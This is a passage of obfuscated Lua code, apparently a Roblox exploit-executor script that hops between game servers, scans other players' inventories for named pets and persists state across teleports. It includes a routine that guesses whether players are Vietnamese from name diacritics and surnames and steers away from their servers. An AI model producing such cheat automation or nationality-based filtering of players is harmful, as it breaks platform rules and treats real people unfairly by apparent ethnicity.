ok,d=pcall(function() return HttpService:JSONDecode(s);end);if ok then return d;end end local function jencode(t) local FlatIdent_826F7=0;local ok;local s;while true do if (FlatIdent_826F7==0) then ok,s=pcall(function() return HttpService:JSONEncode(t);end);if ok then return s;end break;end end end local function wait_range(a,b) task.wait(a + (math.random() * (b-a)) );end local function on_cooldown(id) local FlatIdent_35651=0;local t;while true do if (0==FlatIdent_35651) then t=fail_cooldown[id];return t and ((now() -t)<=CONFIG.FAIL_COOLDOWN) ;end end end local function http_get(url) local ok,body=pcall(game.HttpGet,game,url,true);if (ok and body) then return true,body;end if (syn and syn.request) then local FlatIdent_4114B=0;local r;while true do if (0==FlatIdent_4114B) then r=syn.request({Url=url,Method="GET"});if (r and (r.StatusCode==200)) then return true,r.Body;end break;end end end if http_request then local FlatIdent_7EA3B=0;local r;while true do if (FlatIdent_7EA3B==0) then r=http_request({Url=url,Method="GET"});if (r and ((r.StatusCode==200) or (r.StatusCode==0))) then return true,r.Body or r.body ;end break;end end end return false;end local function purge_old() local FlatIdent_27442=0;local t;local n;while true do if (FlatIdent_27442==3) then if (n>CONFIG.MAX_REMEMBER) then local FlatIdent_541BC=0;local drop;while true do if (FlatIdent_541BC==0) then drop=n-CONFIG.MAX_REMEMBER ;for k in pairs(visited) do visited[k]=nil;drop-=1 if (drop<=0) then break;end end break;end end end break;end if (FlatIdent_27442==0) then t=now();for id,ts in pairs(visited) do if ((type(ts)~="number") or ((t-ts)>CONFIG.TTL_SECONDS)) then visited[id]=nil;end end FlatIdent_27442=1;end if (FlatIdent_27442==2) then n=0;for _ in pairs(visited) do n+=1 end FlatIdent_27442=3;end if (FlatIdent_27442==1) then for id,ts in pairs(fail_cooldown) do if ((t-ts)>CONFIG.FAIL_COOLDOWN) then fail_cooldown[id]=nil;end end for id,exp in pairs(tblack) do if ((type(exp)~="number") or (t>=exp)) then tblack[id]=nil;end end FlatIdent_27442=2;end end end local function get_tpdata() local FlatIdent_91E56=0;local out;while true do if (1==FlatIdent_91E56) then return out;end if (FlatIdent_91E56==0) then out=nil;pcall(function() local td=TeleportService:GetLocalPlayerTeleportData();if (td==nil) then out=nil;elseif ((typeof(td)=="Instance") and (td.ClassName=="TeleportOptions")) then local ok,tbl=pcall(function() return td:GetTeleportData();end);if (ok and (type(tbl)=="table")) then out=tbl;end elseif (type(td)=="table") then out=td;end end);FlatIdent_91E56=1;end end end local function merge_num_map(dst,src) local FlatIdent_8D717=0;while true do if (FlatIdent_8D717==0) then if (type(src)~="table") then return;end for k,v in pairs(src) do if ((type(k)=="string") and (type(v)=="number")) then dst[k]=v;end end break;end end end local function reset_visited() local FlatIdent_2B6D7=0;while true do if (FlatIdent_2B6D7==0) then visited={};pcall(function() if (typeof(del_file)=="function") then del_file(VISITED_FILE);end end);FlatIdent_2B6D7=1;end if (FlatIdent_2B6D7==1) then print("[ServerHop] Đã reset danh sách server đã vào.");break;end end end if rawget(shared,"RESET_VISITED") then reset_visited();shared.RESET_VISITED=nil;end local function save_blacklist() if (CONFIG.PERSIST_TO_DISK and write_file) then local FlatIdent_16507=0;local s;while true do if (FlatIdent_16507==0) then s=jencode(tblack);if s then pcall(write_file,TBLACK_FILE,s);end break;end end end end local function load_blacklist() if (CONFIG.PERSIST_TO_DISK and has_file and isfile(TBLACK_FILE)) then local ok,raw=pcall(read_file,TBLACK_FILE);if (ok and raw) then local FlatIdent_376BD=0;local obj;while true do if (FlatIdent_376BD==0) then obj=jdecode(raw);if (type(obj)=="table") then for k,v in pairs(obj) do if (type(v)=="number") then tblack[k]=v;end end end break;end end end end end local function blacklist_add(id,reason) local FlatIdent_78702=0;while true do if (FlatIdent_78702==1) then print(("[ServerHop] 🛑 Blacklist 1h: %s (%s)"):format(tostring(id),tostring(reason or "" )));save_blacklist();break;end if (FlatIdent_78702==0) then if ( not CONFIG.TEMP_BLACKLIST_ENABLED or  not id) then return;end tblack[id]=now() + CONFIG.TEMP_BLACKLIST_TTL ;FlatIdent_78702=1;end end end local function is_blacklisted(id) if  not CONFIG.TEMP_BLACKLIST_ENABLED then return false;end local exp=tblack[id];return exp and (now()<exp) ;end if rawget(shared,"ADD_BLACKLIST") then local val=shared.ADD_BLACKLIST;if (type(val)=="string") then blacklist_add(val,"manual");elseif (type(val)=="table") then for _,jid in ipairs(val) do blacklist_add(tostring(jid),"manual");end end shared.ADD_BLACKLIST=nil;end if rawget(shared,"RESET_BLACKLIST") then local FlatIdent_7C70E=0;while true do if (FlatIdent_7C70E==1) then print("[ServerHop] Đã reset blacklist tạm (1h).");shared.RESET_BLACKLIST=nil;break;end if (FlatIdent_7C70E==0) then tblack={};pcall(function() if (typeof(del_file)=="function") then del_file(TBLACK_FILE);end end);FlatIdent_7C70E=1;end end end local function save_persist() if (CONFIG.PERSIST_TO_DISK and write_file) then local s=jencode(visited);if s then pcall(write_file,VISITED_FILE,s);end end end local function load_persist() local FlatIdent_5E6B8=0;local td;while true do if (FlatIdent_5E6B8==1) then if (CONFIG.PERSIST_TO_DISK and has_file and isfile(VISITED_FILE)) then local FlatIdent_4E8B4=0;local ok;local raw;while true do if (FlatIdent_4E8B4==0) then ok,raw=pcall(read_file,VISITED_FILE);if (ok and raw) then merge_num_map(visited,jdecode(raw) or {} );end break;end end end if rawget(shared,"__HOP_CARRY") then local c=shared.__HOP_CARRY;if c.visited then merge_num_map(visited,c.visited);end end FlatIdent_5E6B8=2;end if (0==FlatIdent_5E6B8) then td=get_tpdata();if (td and td.visited) then merge_num_map(visited,td.visited);end FlatIdent_5E6B8=1;end if (FlatIdent_5E6B8==2) then visited[JOB_ID]=now();purge_old();break;end end end local function carry_on_tp() if  not queue_on_tp then return;end local blob=jencode(visited) or "{}" ;pcall(queue_on_tp,([[shared.__HOP_CARRY={visited=%s}]]):format(blob));end local function fetch_v1(cursor) local url=("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100%s"):format(TARGET_PLACE_ID,(cursor and ("&cursor="   .. HttpService:UrlEncode(cursor))) or "" );local ok,body=http_get(url);if  not ok then return nil;end local obj=jdecode(body);if  not obj then return nil;end return obj;end local function fetch_legacy(startindex) local FlatIdent_3815D=0;local url;local ok;local body;local obj;local data;while true do if (2==FlatIdent_3815D) then obj=jdecode(body);if ( not obj or  not obj.Collection) then return nil;end FlatIdent_3815D=3;end if (FlatIdent_3815D==3) then data={};for _,v in ipairs(obj.Collection) do local FlatIdent_2793C=0;local players;while true do if (1==FlatIdent_2793C) then table.insert(data,{id=v.Guid,maxPlayers=v.Capacity,playing=(v.CurrentPlayers and  #v.CurrentPlayers) or v.CurrentPlayers or 0 ,ping=tonumber(v.Ping),players=players});break;end if (FlatIdent_2793C==0) then players={};if (type(v.CurrentPlayers)=="table") then for _,p in ipairs(v.CurrentPlayers) do table.insert(players,{username=tostring(p.Username or "" ),display=tostring(p.DisplayName or "" )});end end FlatIdent_2793C=1;end end end FlatIdent_3815D=4;end if (FlatIdent_3815D==1) then ok,body=http_get(url);if  not ok then return nil;end FlatIdent_3815D=2;end if (FlatIdent_3815D==0) then startindex=tonumber(startindex) or 0 ;url=("https://www.roblox.com/games/getgameinstancesjson?placeId=%d&startindex=%d"):format(TARGET_PLACE_ID,startindex);FlatIdent_3815D=1;end if (FlatIdent_3815D==4) then return {data=data,nextPageCursor=(( #data==0) and nil) or tostring(startindex + 10 ) };end end end local VIET_CHARS_PATTERN="[àáạảãâầấậẩẫ ăằắặẳẵèéẹẻẽêềếệểễ ìíịỉĩ òóọỏõôồốộổỗơờớợởỡ ùúụủũưừứựửữ ỳýỵỷỹ đĐ]";local VN_KEYWORDS={" viet"," việt"," vn"," nguyen"," trần"," tran "," lê "," le "," pham "," phạm "," ngoc "," minh "};local function looks_vietnamese(s) s=" "   .. string.lower(s or "" )   .. " " ;if s:find(VIET_CHARS_PATTERN) then return true;end for _,kw in ipairs(VN_KEYWORDS) do if s:find(kw,1,true) then return true;end end return false;end local function vn_ratio(players) local FlatIdent_750D4=0;local vn;local total;while true do if (1==FlatIdent_750D4) then for _,p in ipairs(players) do local FlatIdent_26792=0;while true do if (FlatIdent_26792==0) then total+=1 if (looks_vietnamese(p.display) or looks_vietnamese(p.username)) then vn+=1 end break;end end end return vn/total ;end if (FlatIdent_750D4==0) then if ( not players or ( #players==0)) then return 0;end vn,total=0,0;FlatIdent_750D4=1;end end end local PET_NAMES,PET_HOLD,PET_LAST_SEEN,PET_LAST_FOUND_LIST={},false,0,{};local function normalize_pet_list(text) local set={};for raw in tostring(text):gmatch("[^\r\n]+") do local line=raw:gsub("^%s+",""):gsub("%s+$","");if ((line~="") and  not line:match("^%-%-")) then local FlatIdent_1A2AA=0;local nameOnly;while true do if (FlatIdent_1A2AA==0) then nameOnly=line:match("^(.-):") or line ;nameOnly=nameOnly:gsub("%s+$","");FlatIdent_1A2AA=1;end if (1==FlatIdent_1A2AA) then set[string.lower(nameOnly)]=true;break;end end end end return set;end local function load_pet_names() local set=normalize_pet_list(PET_LIST or "" );if (has_file and isfile("pets_list.txt")) then local ok,raw=pcall(read_file,"pets_list.txt");if (ok and raw) then for k,_ in pairs(normalize_pet_list(raw)) do set[k]=true;end end end PET_NAMES=set;end local function name_hit(sLower) for want,_ in pairs(PET_NAMES) do if sLower:find(want,1,true) then return want;end end end local function scan_for_pets() if (next(PET_NAMES)==nil) then return false,{};end local found,matched=false,{};for _,plr in ipairs(Players:GetPlayers()) do local ch=plr.Character;if ch then for _,inst in ipairs(ch:GetDescendants()) do local FlatIdent_86AD=0;local nm;local hit;while true do if (FlatIdent_86AD==1) then if hit then local FlatIdent_23179=0;while true do if (FlatIdent_23179==0) then found=true;matched[hit]=true;break;end end end if inst:IsA("StringValue") then local v=string.lower(tostring(inst.Value or "" ));local h2=name_hit(v);if h2 then local FlatIdent_5495F=0;while true do if (0==FlatIdent_5495F) then found=true;matched[h2]=true;break;end end end end break;end if (FlatIdent_86AD==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_86AD=1;end end end end local bp=plr:FindFirstChildOfClass("Backpack");if bp then for _,inst in ipairs(bp:GetDescendants()) do local FlatIdent_23986=0;local nm;local hit;while true do if (FlatIdent_23986==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_23986=1;end if (FlatIdent_23986==1) then if hit then local FlatIdent_93EAF=0;while true do if (FlatIdent_93EAF==0) then found=true;matched[hit]=true;break;end end end break;end end end end end for _,inst in ipairs(workspace:GetDescendants()) do if (inst:IsA("Model") or inst:IsA("Folder") or inst:IsA("Accessory") or inst:IsA("Tool")) then local FlatIdent_83FD4=0;local nm;local hit;while true do if (FlatIdent_83FD4==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_83FD4=1;end if (FlatIdent_83FD4==1) then if hit then local FlatIdent_3B7A2=0;while true do if (FlatIdent_3B7A2==0) then found=true;matched[hit]=true;break;end end end break;end end elseif inst:IsA("StringValue") then local FlatIdent_7220B=0;local v;local h2;while true do if (FlatIdent_7220B==1) then if h2 then local FlatIdent_44BA0=0;while true do if (FlatIdent_44BA0==0) then found=true;matched[h2]=true;break;end end end break;end if (FlatIdent_7220B==0) then v=string.lower(tostring(inst.Value or "" ));h2=name_hit(v);FlatIdent_7220B=1;end end end end return found,matched;end local function update_pet_hold() local ok,matched=scan_for_pets();local tnow=tick();if ok then local FlatIdent_19780=0;while true do if (0==FlatIdent_19780) then PET_LAST_SEEN=tnow;if  not PET_HOLD then local FlatIdent_217CE=0;while true do if (FlatIdent_217CE==0) then PET_HOLD=true;PET_LAST_FOUND_LIST={};FlatIdent_217CE=1;end if (FlatIdent_217CE==1) then for k,_ in pairs(matched) do table.insert(PET_LAST_FOUND_LIST,k);end print("[ServerHop] ▶️ gặp PET → dừng:",table.concat(PET_LAST_FOUND_LIST,", "));break;end end end break;end end elseif (PET_HOLD and ((tnow-PET_LAST_SEEN)>=CONFIG.PET_CLEAR_GRACE)) then PET_HOLD=false;print("[ServerHop] ⏩ pet hết → tiếp tục");end end local function in_pref(n) for _,v in ipairs(CONFIG.PREFERRED_COUNTS) do if (n==v) then return true;end end end local function pick_server() local bestPref,bestNear,bestFb,bestAny=nil,nil,nil,nil;local nearScore,fbScore,anyScore= -999999995904, -999999995904, -999999995904;local cursor,tries,mode=nil,0,"legacy";local function consider(s) local FlatIdent_F1E5=0;local id;local playing;local cap;local open;local vr;local isVN;local vnPenalty;local openPenalty;local pingBonus;while true do if (FlatIdent_F1E5==0) then id=s.id;playing=tonumber(s.playing) or 0 ;cap=tonumber(s.maxPlayers) or 100 ;FlatIdent_F1E5=1;end if (FlatIdent_F1E5==3) then openPenalty=((open<CONFIG.MIN_OPEN_SOFT) and 2) or 0 ;pingBonus=(s.ping and (CONFIG.LOCALE.prefer_higher_ping_ms>0) and (s.ping>=CONFIG.LOCALE.prefer_higher_ping_ms) and 0.5) or 0 ;if (in_pref(playing) and (open>0)) then local FlatIdent_2D06D=0;local sc;while true do if (FlatIdent_2D06D==0) then sc=((10000 -(open * 0.01)) -vnPenalty) + pingBonus ;if ( not bestPref or (sc>(10000 -0.01))) then bestPref=s;end break;end end end FlatIdent_F1E5=4;end if (FlatIdent_F1E5==2) then vr=(s.players and vn_ratio(s.players)) or 0 ;isVN=CONFIG.LOCALE.avoid_vietnamese and (vr>=CONFIG.LOCALE.vn_ratio_threshold) ;vnPenalty=(isVN and CONFIG.LOCALE.penalty_if_vn) or 0 ;FlatIdent_F1E5=3;end if (FlatIdent_F1E5==4) then if ((playing>=CONFIG.NEAR_WINDOW.min) and (playing<=CONFIG.NEAR_WINDOW.max) and (open>0)) then local FlatIdent_4CBD6=0;local sc;while true do if (FlatIdent_4CBD6==0) then sc=((( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -(open * 0.001)) -vnPenalty) + pingBonus ;if (sc>nearScore) then nearScore=sc;bestNear=s;end break;end end end if ((open>0) and (playing>=CONFIG.FALLBACK_MIN)) then local FlatIdent_49276=0;local sc;while true do if (FlatIdent_49276==0) then sc=(( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -vnPenalty) + pingBonus ;if (sc>fbScore) then fbScore=sc;bestFb=s;end break;end end end if (open>0) then local FlatIdent_973AE=0;local sc;while true do if (FlatIdent_973AE==0) then sc=(( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -vnPenalty) + pingBonus ;if (sc>anyScore) then local FlatIdent_18A8E=0;while true do if (FlatIdent_18A8E==0) then anyScore=sc;bestAny=s;break;end end end break;end end end break;end if (FlatIdent_F1E5==1) then open=cap-playing ;if ((id==JOB_ID) or visited[id] or on_cooldown(id) or (CONFIG.TEMP_BLACKLIST_ENABLED and is_blacklisted(id))) then return;end if (CONFIG.AVOID_FULL and (open<=0)) then return;end FlatIdent_F1E5=2;end end end while tries<60  do local page=((mode=="legacy") and fetch_legacy(cursor)) or fetch_v1(cursor) ;if  not page then local FlatIdent_40D1F=0;while true do if (FlatIdent_40D1F==0) then mode=((mode=="legacy") and "v1") or "legacy" ;tries+=1 break;end end else for _,s in ipairs(page.data or {} ) do consider(s);end if (bestPref or ( not page.nextPageCursor and (bestNear or bestFb or bestAny))) then break;end cursor=page.nextPageCursor;if  not cursor then mode=((mode=="legacy") and "v1") or "legacy" ;end tries+=1 end end if bestPref then return bestPref,"pref6/7";end if bestNear then return bestNear,"near(4-9)";end if bestFb then return bestFb,"fallback>=2";end return bestAny,"anyopen";end local function try_teleport(jobId,reason) local FlatIdent_7FCDC=0;local ok;local err;while true do if (FlatIdent_7FCDC==2) then task.wait(0.05);ok,err=pcall(function() TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID,jobId,LP,nil,{visited=visited});end);FlatIdent_7FCDC=3;end if (FlatIdent_7FCDC==0) then print(("[ServerHop] Calling Teleport (reason=%s)"):format(reason or "?" ));ok,err=pcall(function() TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID,jobId,LP);end);FlatIdent_7FCDC=1;end if (FlatIdent_7FCDC==1) then if ok then return true;end warn("[ServerHop] Teleport 3-arg error: "   .. tostring(err) );FlatIdent_7FCDC=2;end if (FlatIdent_7FCDC==3) then if ok then return true;end warn("[ServerHop] Teleport 5-arg error: "   .. tostring(err) );FlatIdent_7FCDC=4;end if (FlatIdent_7FCDC==4) then return false,err;end end end local function try_random(reason) local FlatIdent_50219=0;local ok;local err;while true do if (FlatIdent_50219==3) then if ok then return true;end warn("[ServerHop] Random Teleport(place) error: "   .. tostring(err) );FlatIdent_50219=4;end if (FlatIdent_50219==1) then if ok then return true;end warn("[ServerHop] Random Teleport(place,player,data) error: "   .. tostring(err) );FlatIdent_50219=2;end if (0==FlatIdent_50219) then print(("[ServerHop] Random Teleport (reason=%s)"):format(reason or "?" ));ok,err=pcall(function() TeleportService:Teleport(TARGET_PLACE_ID,LP,{visited=visited});end);FlatIdent_50219=1;end if (FlatIdent_50219==4) then return false,err;end if (FlatIdent_50219==2) then task.wait(0.05);ok,err=pcall(function() TeleportService:Teleport(TARGET_PLACE_ID);end);FlatIdent_50219=3;end end end local function save_and_carry() local FlatIdent_54A3A=0;while true do if (FlatIdent_54A3A==0) then if (CONFIG.PERSIST_TO_DISK and write_file) then local s=jencode(visited);if s then pcall(write_file,VISITED_FILE,s);end end if queue_on_tp then local FlatIdent_6F3CF=0;local blob;while true do if (0==FlatIdent_6F3CF) then blob=jencode(visited) or "{}" ;pcall(queue_on_tp,([[shared.__HOP_CARRY={visited=%s}]]):format(blob));break;end end end break;end end end local function hop_once(tag) local FlatIdent_3A4FA=0;local target;local why;local okTeleport;while true do if (1==FlatIdent_3A4FA) then target,why=pick_server();if  not target then local FlatIdent_4BD9E=0;while true do if (0==FlatIdent_4BD9E) then warn("[ServerHop] Hết server phù hợp. Chờ rồi thử lại…");HOP_LOCK=false;FlatIdent_4BD9E=1;end if (FlatIdent_4BD9E==1) then return;end end end LAST_TARGET_ID=target.id;LAST_ATTEMPT_AT=clk();FlatIdent_3A4FA=2;end if (FlatIdent_3A4FA==0) then if (HOP_LOCK or PET_HOLD) then return;end HOP_LOCK=true;LOCK_AT=clk();purge_old();FlatIdent_3A4FA=1;end if (FlatIdent_3A4FA==2) then save_and_carry();print(string.format("[ServerHop] Hopping to %s | players=%s (%s)",target.id,tostring(target.playing),tostring(why)));okTeleport=try_teleport(target.id,why);if  not okTeleport then local FlatIdent_1D5BD=0;while true do if (FlatIdent_1D5BD==0) then HOP_LOCK=false;return;end end end break;end end end TeleportService.TeleportInitFailed:Connect(function(plr,result,errMsg) local FlatIdent_91278=0;while true do if (FlatIdent_91278==1) then if LAST_TARGET_ID then local FlatIdent_95CDD=0;while true do if (FlatIdent_95CDD==0) then fail_cooldown[LAST_TARGET_ID]=now();if (CONFIG.TEMP_BLACKLIST_ENABLED and CONFIG.TEMP_BLACKLIST_ON_FAIL) then blacklist_add(LAST_TARGET_ID,"fail:"   .. tostring(result) );end break;end end end CONSEC_FAILS+=1 FlatIdent_91278=2;end if (FlatIdent_91278==3) then if ((CONSEC_FAILS>=CONFIG.ESCALATE_AFTER_FAILS) and  not PET_HOLD) then CONSEC_FAILS=0;try_random("escalate-fails");else hop_once("retry:"   .. tostring(result) );end break;end if (FlatIdent_91278==0) then if (plr~=LP) then return;end warn("[ServerHop] Teleport failed: "   .. tostring(result)   .. " | "   .. tostring(errMsg) );FlatIdent_91278=1;end if (FlatIdent_91278==2) then HOP_LOCK=false;wait_range(CONFIG.RETRY_BACKOFF.min,CONFIG.RETRY_BACKOFF.max);FlatIdent_91278=3;end end end);local function boot() local FlatIdent_37B33=0;local td;while true do if (FlatIdent_37B33==1) then if (td and td.visited) then merge_num_map(visited,td.visited);end load_persist();break;end if (FlatIdent_37B33==0) then load_blacklist();td=get_tpdata();FlatIdent_37B33=1;end end end local function safe(f) local ok,err=pcall(f);if  not ok then warn("[ServerHop] init err: ",err);end end safe(load_pet_names);safe(boot);save_blacklist();save_persist();task.defer(function() wait_range(CONFIG.HOP_DELAY_SEC.min,CONFIG.HOP_DELAY_SEC.max);hop_once("start");end);task.spawn(function() local FlatIdent_8224F=0;local lastLoop;local lastScan;while true do if (0==FlatIdent_8224F) then lastLoop,lastScan=clk(),0;while task.wait(0.25) do if ((tick() -lastScan)>=CONFIG.PET_SCAN_INTERVAL) then local FlatIdent_13BD2=0;while true do if (FlatIdent_13BD2==0) then lastScan=tick();update_pet_hold();break;end end end if (HOP_LOCK and ((clk() -LOCK_AT)>CONFIG.LOCK_WATCHDOG)) then HOP_LOCK=false;if LAST_TARGET_ID then fail_cooldown[LAST_TARGET_ID]=now();end print("[ServerHop] Watchdog: unlock stale lock → hop ngay");hop_once("watchdog");end if ( not HOP_LOCK and  not PET_HOLD and ((clk() -LAST_ATTEMPT_AT)>CONFIG.STALL_TIMEOUT_SEC)) then local FlatIdent_25EB1=0;while true do if (FlatIdent_25EB1==0) then CONSEC_FAILS=0;try_random("stall-timeout");FlatIdent_25EB1=1;end if (FlatIdent_25EB1==1) then LAST_ATTEMPT_AT=clk();break;end end end if ( not HOP_LOCK and  not PET_HOLD and ((clk() -lastLoop)>=CONFIG.LOOP_INTERVAL)) then local FlatIdent_49CE4=0;while true do if (0==FlatIdent_49CE4) then lastLoop=clk();hop_once("loop");break;end end end end break;end end end);print(string.format("[ServerHop] Ready on PlaceId=%d | ưu tiên 6–7, né server 'VN', block server cũ, blacklist tạm 1h | cooldown %ds",TARGET_PLACE_ID,CONFIG.FAIL_COOLDOWN));end);elseif finder_secret_50m_s_auto_thread then local FlatIdent_33275=0;while true do if (FlatIdent_33275==0) then task.cancel(finder_secret_50m_s_auto_thread);finder_secret_50m_s_auto_thread=nil;break;end end end end);
-- ⚠️ WARNING: integrity protected!
--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--
